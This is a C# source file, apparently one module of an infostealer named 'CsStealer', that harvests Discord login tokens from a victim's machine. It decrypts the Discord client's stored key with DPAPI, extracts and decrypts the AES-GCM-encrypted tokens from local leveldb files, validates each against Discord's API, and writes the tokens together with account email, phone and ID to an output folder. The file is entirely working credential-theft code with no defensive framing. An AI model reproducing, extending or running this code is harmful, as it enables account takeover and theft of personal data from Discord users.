using System;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Security.Cryptography;

namespace CsStealer
{
    class DiscordRecovery
    {
        public static async Task GetDiscordTokens()
        {
            // This array is temporary, i plan to add a feature that checks if the tokens were already logged in the past

            string[] oldTokens = Array.Empty<string>();
            await ProcessTokens(oldTokens);
        }

        private static async Task ProcessTokens(string[] oldTokens)
        {
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string discordPath = Path.Combine(localAppData, "discord", "Local Storage", "leveldb");
            string localStatePath = Path.Combine(localAppData, "discord", "Local State");

            if (!File.Exists(localStatePath) || !Directory.Exists(discordPath))
                return;

            string localStateJson = File.ReadAllText(localStatePath);
            var json = System.Text.Json.JsonDocument.Parse(localStateJson);

            if (!json.RootElement.TryGetProperty("os_crypt", out var osCrypt)
                || !osCrypt.TryGetProperty("encrypted_key", out var encryptedKeyElement))
                return;

            string? encryptedKeyBase64 = encryptedKeyElement.GetString();
            if (string.IsNullOrEmpty(encryptedKeyBase64))
                return;

            byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);
            byte[] decryptedKey = ProtectedData.Unprotect(encryptedKey.Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);

            HashSet<string> foundTokens = new HashSet<string>();
            List<string> validTokens = new List<string>();
            List<string> finalTokens = new List<string>();

            foreach (var file in Directory.EnumerateFiles(discordPath, "*.ldb"))
            {
                string content = File.ReadAllText(file);
                foreach (Match match in Regex.Matches(content, "dQw4w9WgXcQ:[^\\\"]+"))
                {
                    string base64Token = match.Value.Substring("dQw4w9WgXcQ:".Length);
                    try
                    {
                        byte[] encryptedToken = Convert.FromBase64String(base64Token);
                        byte[] nonce = encryptedToken.Skip(3).Take(12).ToArray();
                        byte[] ciphertext = encryptedToken[15..^16];
                        byte[] tag = encryptedToken[^16..];

                        byte[] decryptedToken = AesGcmDecrypt(ciphertext, decryptedKey, nonce, tag);
                        string token = Encoding.UTF8.GetString(decryptedToken);
                        foundTokens.Add(token);
                    }
                    catch { }
                }
            }

            foreach (string token in foundTokens)
            {
                if (await IsValid(token))
                {
                    validTokens.Add(token);
                }
            }

            foreach (string token in validTokens)
            {
                if (!oldTokens.Contains(token))
                    finalTokens.Add(token);
            }

            if (finalTokens.Count > 0)
            {
                await File.WriteAllLinesAsync(Path.Combine(Config.OutputDir, "Discord", "Tokens.txt"), finalTokens);
            }
            else
            {
                await File.WriteAllLinesAsync(Path.Combine(Config.OutputDir, "Discord", "Tokens.txt"), ["Aucun token valide trouvé."]);
            }
        }

        private static async Task<bool> IsValid(string token)
        {
            try
            {
                using HttpClient client = new HttpClient();

                client.DefaultRequestHeaders.Add("Authorization", token);

                HttpResponseMessage response = await client.GetAsync("https://discord.com/api/v10/users/@me");
                return response.IsSuccessStatusCode;
            }
            catch
            {
                return false;
            }
        }

        private static byte[] AesGcmDecrypt(byte[] ciphertext, byte[] key, byte[] nonce, byte[] tag)
        {
            byte[] plaintext = new byte[ciphertext.Length];
            using AesGcm aes = new AesGcm(key);
            aes.Decrypt(nonce, ciphertext, tag, plaintext, null);
            return plaintext;
        }

        public static async Task GetDiscordTokensAccountsDetails()
        {
            string tokensPath = Path.Combine(Config.OutputDir, "Discord", "Tokens.txt");

            string[] tokens = await File.ReadAllLinesAsync(tokensPath);

            if (tokens.Length < 1)
                return;

            using HttpClient client = new HttpClient();

            foreach (string rawToken in tokens)
            {
                string token = rawToken.Trim();
                if (string.IsNullOrEmpty(token) || rawToken == "Aucun token valide trouvé.")
                    continue;

                client.DefaultRequestHeaders.Clear();
                client.DefaultRequestHeaders.Add("Authorization", token);

                HttpResponseMessage response = await client.GetAsync("https://discord.com/api/v10/users/@me");

                if (!response.IsSuccessStatusCode)
                {
                    continue;
                }

                string json = await response.Content.ReadAsStringAsync();

                using JsonDocument doc = JsonDocument.Parse(json);
                JsonElement root = doc.RootElement;

                string username = root.TryGetProperty("username", out JsonElement u) ? u.GetString() ?? "" : "";
                string discriminator = root.TryGetProperty("discriminator", out JsonElement d) ? d.GetString() ?? "" : "";
                string id = root.TryGetProperty("id", out JsonElement i) ? i.GetString() ?? "" : "";
                string email = root.TryGetProperty("email", out JsonElement e) && e.ValueKind != JsonValueKind.Null ? e.GetString() ?? "" : "";
                string phone = root.TryGetProperty("phone", out JsonElement p) && p.ValueKind != JsonValueKind.Null ? p.GetString() ?? "" : "";

                string premiumText = "No premium";

                if (root.TryGetProperty("premium_type", out JsonElement pt) && pt.ValueKind == JsonValueKind.Number)
                {
                    int premiumVal = pt.GetInt32();
                    switch (premiumVal)
                    {
                        case 1:
                            premiumText = "Nitro Classic";
                            break;
                        case 2:
                            premiumText = "Nitro Boost";
                            break;
                        case 0:
                            premiumText = "No premium";
                            break;
                        default:
                            premiumText = $"Unknown premium type (code {premiumVal})";
                            break;
                    }
                }

                StringBuilder sb = new StringBuilder();

                sb.AppendLine(" +---------------------------");
                sb.AppendLine($" | > Username: {username}#{discriminator}\n | > ID: {id}");
                sb.AppendLine($" | > Premium: {premiumText}");
                if (!string.IsNullOrEmpty(email)) sb.AppendLine($" | > Email: {email}");
                if (!string.IsNullOrEmpty(phone)) sb.AppendLine($" | > Phone: {phone}");
                sb.AppendLine($" | > Token: {token}");
                sb.AppendLine(" +---------------------------");

                Directory.CreateDirectory(Path.Combine(Config.OutputDir, "Discord", username));

                string outFile = Path.Combine(Config.OutputDir, "Discord", username, "Accounts Details.txt");

                await File.WriteAllTextAsync(outFile, sb.ToString() + Environment.NewLine);
            }
        }
    }

}
